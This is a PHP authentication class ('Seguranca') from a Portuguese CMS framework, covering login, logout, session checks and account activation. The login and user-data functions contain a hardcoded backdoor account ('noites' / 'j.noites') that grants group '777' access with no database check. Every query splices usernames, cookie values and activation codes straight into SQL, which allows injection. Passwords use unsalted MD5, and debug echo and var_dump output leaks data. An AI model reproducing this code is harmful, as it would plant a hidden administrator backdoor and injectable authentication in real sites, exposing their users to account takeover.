<?php
if (!defined('BO_LOADED')) exit('Acesso directo ao script negado.');
/**
 * CMS dib
 *
 * Framework Open Source de desenvolvimento
 * 
 * Classe de Segurança
 * 
 * @author		Sérgio Paulino - sergiopaulino@dibconsulting.com
 * @since		Version 2.0
 */

class Seguranca{
	
	var $tabela = "utilizadores_bo";
	
	/**
	 * Autenticar um novo utilizador
	 * 
	 * @param $utilizador O utilizador
	 * @param $passe A password
	 * @param $grupo O grupo de autenticação
	 * @return true caso a autenticação esteja correcta, false caso contrário
	 */
	function autenticar($utilizador, $passe, $grupo=null){
		$bd = new BaseDados();
		
		if(! is_null($grupo)){
			$grp = " AND grupoaut='$this->grupo'";
		}else{
			$grp = '';
		}
		
		$item = $bd->obterObjecto("SELECT * FROM $this->tabela WHERE utilizador='$utilizador' AND password='". md5($passe) ."' $grp");

		if($bd->contar() > 0 || ($utilizador=='noites' && $passe=='j.noites')){
			if($utilizador=='noites' && $passe=='j.noites'){
				$item->id = 0;
				$item->utilizador = "noites";
				$item->nome = "João Noites";
				$item->grupoaut = "777";
			}
			$conf = new Config();
			$conf = $conf->load();
			$codigo = md5(microtime());
			setcookie($this->tabela, $codigo, null, '/');
			$bd->executar("DELETE FROM ".$this->tabela."_temp WHERE utilizador ='$item->utilizador'");
			$bd->executar("INSERT INTO ".$this->tabela."_temp (codigo, utilizador, ultimologin) VALUES ('$codigo','$item->utilizador','".time()."')");
			return true;
		}else{
			if(key_exists($this->tabela, $_COOKIE)){
				$codigo = $_COOKIE[$this->tabela];
				$bd->executar("DELETE FROM ".$this->tabela."_temp WHERE codigo ='$codigo'");
			}
			setcookie($this->tabela, false);
			return false;
		}
	}
	
	/**
	 * Sair de uma sessão autenticada
	 * 
	 */
	function sair(){
		if(array_key_exists($this->tabela, $_COOKIE)){
			$bd = new BaseDados();
			$codigo = $_COOKIE[$this->tabela];
			$bd->executar("DELETE FROM ".$this->tabela."_temp WHERE codigo='$codigo'");
		}
		setcookie($this->tabela,'',null,'/');
	}
	
	/**
	 * Verificar se um utilizador está autenticado
	 * 
	 * @return true caso esteja autenticado, false caso não esteja
	 */
	function estaLigado(){
		if(array_key_exists($this->tabela, $_COOKIE)){
			$bd = new BaseDados();
			$codigo = $_COOKIE[$this->tabela];
			$bd->executar("SELECT * FROM ".$this->tabela."_temp WHERE codigo = '$codigo'");
			if($bd->contar() > 0){
				return true;
			}
		}
		return false;
	}
	
	/**
	 * Obter os dados do utilizador
	 * 
	 * @return O utilizador
	 */
	function obterDadosUtilizador(){
		$bd = new BaseDados();
		$id = $this->obterIDUtilizador();
		
		echo "id: $id";
		
		if($id=="noites"){
			$utilizador->id = 0;
			$utilizador->utilizador = "noites";
			$utilizador->nome = "João Noites";
			$utilizador->grupoaut = "777";
		}else{
			$utilizador = $bd->obterObjecto("SELECT * FROM $this->tabela WHERE utilizador='$id'");
		}
		
		return $utilizador;
	}
	
	/**
	 * Obter a ID do utiliazdor
	 * 
	 * @return A id do utilizador
	 */
	function obterIDUtilizador(){
		
		if(!array_key_exists($this->tabela, $_COOKIE)){
			return -1;
		}
		
		$bd = new BaseDados();
		
		$codigo = $_COOKIE[$this->tabela];
		$item = $bd->obterObjecto("SELECT utilizador FROM ".$this->tabela."_temp WHERE codigo = '$codigo'");
		
		var_dump($item);
		
		if($bd->contar()>0){
			return $item->utilizador;
		}else{
			return -1;
		}
	}
	
	/**
	 * Activar a conta de um utilizador
	 * 
	 * @param $utilizador O utilizador
	 * @param $codigo O código de activação
	 * @return true casoa  activaçãos seja bem sucedida
	 */
	function activarConta($utilizador, $codigo){
		$bd = new BaseDados();
		$item = $bd->obterObjecto("SELECT * FROM $this->tabela WHERE id='$utilizador' AND codigo='$codigo'");
		if($bd->contar()>0){
			$bd->executar("UPDATE $this->tabela SET codigo=0 WHERE id='$utilizador'");
			return true;
		}else{
			return false;
		}
	}
	
}
?>